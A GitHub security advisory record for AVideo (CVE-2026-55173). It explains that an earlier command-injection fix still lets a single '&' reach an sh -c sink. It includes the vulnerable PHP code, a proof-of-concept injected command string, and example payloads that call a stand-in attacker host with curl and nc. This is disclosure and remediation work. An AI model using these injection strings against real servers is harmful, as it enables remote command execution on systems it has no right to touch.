{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/29829469?v=4", "events_url": "https://api.github.com/users/anir0y/events{/privacy}", "followers_url": "https://api.github.com/users/anir0y/followers", "following_url": "https://api.github.com/users/anir0y/following{/other_user}", "gists_url": "https://api.github.com/users/anir0y/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/anir0y", "id": 29829469, "login": "anir0y", "node_id": "MDQ6VXNlcjI5ODI5NDY5", "organizations_url": "https://api.github.com/users/anir0y/orgs", "received_events_url": "https://api.github.com/users/anir0y/received_events", "repos_url": "https://api.github.com/users/anir0y/repos", "site_admin": false, "starred_url": "https://api.github.com/users/anir0y/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/anir0y/subscriptions", "type": "User", "url": "https://api.github.com/users/anir0y", "user_view_type": "public"}}], "cve_id": "CVE-2026-55173", "cvss": {"score": 8.1, "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}, "cvss_severities": {"cvss_v3": {"score": 8.1, "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-78", "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"}], "description": "### Summary

The fix for CVE-2026-33482 (GHSA-pmj8-r2j7-xg6c) is incomplete. That advisory reported that `sanitizeFFmpegCommand()` (`plugin/API/standAlone/functions.php`) failed to strip `$(...)` command substitution, allowing OS command injection at the `execAsync()` `sh -c` sink. The fix (commit `25c8ab90`) added `$`, `(`, `)`, `{`, `}`, `\n`, `\r` to the denylist character class and a `str_replace('&&', '', ...)`. It still does **not** neutralize a single `&` (the shell background operator), which remains a command separator at the unchanged sink. Same entry point, same sink, same impact as the original — only the surviving metacharacter differs.

Verified at master HEAD.

### The surviving gap

HEAD `sanitizeFFmpegCommand` (`functions.php`):
```php
$command = str_replace('&&', '', $command);                    // only the doubled form
$command = preg_replace('/\s*&?>.*(?:2>&1)?/', '', $command);  // strips '&' only when followed by '>'
$command = preg_replace('/[;|`<>$()\n\r{}]/', '', $command);   // char class has no '&'
// then requires the result to start with 'ffmpeg'
```
A single `&` is therefore preserved. `ffmpeg ... & <cmd>` passes the sanitizer and the `strpos(trim($command),'ffmpeg')===0` prefix gate.

### Sink (unchanged)

`plugin/API/standAlone/ffmpeg.json.php:418` -> `execAsync($ffmpegCommand, $keyword)`. In `objects/functionsExec.php::execAsync`:
```php
$command = addcslashes($command, '"');   // line 686 — escapes only the double-quote
$commandWithKeyword = "nohup sh -c \"$command & echo \\$! > /tmp/$keyword.pid\" > /dev/null 2>&1 &";  // line 705
exec($commandWithKeyword, ...);          // line 712 — PHP exec() runs via /bin/sh -c
```
The sanitized command is embedded inside an inner `sh -c "..."`. A bare `&` in `$command` separates commands for that inner shell, so the injected command executes. `addcslashes` escaping only `"` does not stop `&`.

### Reachability

`ffmpeg.json.php` builds the command from `_decryptString(getInput('codeToExecEncrypted'))`. This is the **same** threat model the original advisory accepted (“an attacker who can craft a valid encrypted payload can achieve arbitrary command execution on the standalone encoder server”) and the same CVSS basis (`AV:N/AC:H/PR:N`).

### Proof (poc/poc_ampersand_bypass.php, poc/OUTPUT.txt)

Byte-faithful PHP harness: `sanitizeFFmpegCommand` copied verbatim from HEAD + the `execAsync` `sh -c` wrapping copied from `functionsExec.php`:
```
attacker input : ffmpeg -i input.mp4 & touch /tmp/avideo_amp_rce_proof & echo done out.mp4
after sanitize : ffmpeg -i input.mp4 & touch /tmp/avideo_amp_rce_proof & echo done out.mp4
ampersand survived : YES   passes prefix : YES
final sh -c string:
  nohup sh -c "ffmpeg -i input.mp4 & touch /tmp/avideo_amp_rce_proof & echo $! > /tmp/testkw.pid" > /dev/null 2>&1 &
>> injected touch executed: YES (/tmp/avideo_amp_rce_proof)
```
The sanitizer leaves `&` intact and the injected `touch` runs at the sink.

### Impact

Arbitrary OS command execution on the standalone encoder server, identical to CVE-2026-33482. Multiple `&`-separated commands can be chained (e.g. download + execute). Redirect-based payloads are blocked by the `>` strip, but command execution (e.g. `& curl http://attacker/...`, `& nc ...`, dropping/running a file) is not.

### Remediation

Stop applying a metacharacter denylist to a `sh -c` sink. Build the ffmpeg invocation as an argv array with `escapeshellarg()` per token (the project already uses `escapeshellarg()` at 137 sites) instead of interpolating `$command` into `sh -c "..."`. If the denylist is kept as defense-in-depth, add `&` to the stripped set — but the denylist approach has now missed two metacharacters in a row (`$()` then `&`).", "epss": {"percentage": 0.03434, "percentile": 0.87623}, "ghsa_id": "GHSA-wc3f-xc32-435f", "github_reviewed_at": "2026-06-23T17:42:17Z", "html_url": "https://github.com/advisories/GHSA-wc3f-xc32-435f", "identifiers": [{"type": "GHSA", "value": "GHSA-wc3f-xc32-435f"}, {"type": "CVE", "value": "CVE-2026-55173"}], "nvd_published_at": null, "published_at": "2026-06-23T17:42:17Z", "references": ["https://github.com/WWBN/AVideo/security/advisories/GHSA-wc3f-xc32-435f", "https://github.com/WWBN/AVideo/commit/c1cfa2bea8a351a1d07f5758f82887403e3abf1f", "https://github.com/advisories/GHSA-wc3f-xc32-435f"], "repository_advisory_url": "https://api.github.com/repos/WWBN/AVideo/security-advisories/GHSA-wc3f-xc32-435f", "severity": "high", "source_code_location": "https://github.com/WWBN/AVideo", "summary": "AVideo has an incomplete fix of CVE-2026-33482: sanitizeFFmpegCommand still allows a single '&' (background operator), giving OS command execution at the same execAsync sh -c sink", "type": "reviewed", "updated_at": "2026-06-23T17:42:18Z", "url": "https://api.github.com/advisories/GHSA-wc3f-xc32-435f", "vulnerabilities": [{"first_patched_version": null, "package": {"ecosystem": "composer", "name": "wwbn/avideo"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 29.0"}], "withdrawn_at": null}

reasons: 資産不一致または判定情報不足

title: AVideo has an incomplete fix of CVE-2026-33482: sanitizeFFmpegCommand still allows a single '&' (background operator), giving OS command execution at the same execAsync sh -c sink
